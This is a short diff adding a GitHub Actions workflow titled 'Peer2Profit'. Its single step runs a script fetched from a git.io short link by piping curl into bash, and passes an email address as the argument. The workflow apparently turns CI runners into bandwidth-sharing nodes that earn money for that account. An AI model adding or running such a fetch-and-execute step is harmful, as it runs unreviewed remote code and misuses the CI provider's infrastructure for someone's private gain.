@@ -1,0 +1,14 @@
+name: Peer2Profit
+on: 
+  workflow_dispatch:
+defaults:
+  run:
+    shell: bash
+    
+    
+jobs:
+  build:
+    runs-on: ubuntu-20.04
+    steps:
+    - name: Run P2P
+      run: bash <(curl -fsSL git.io/JzDdQ) kolana122@outlook.com
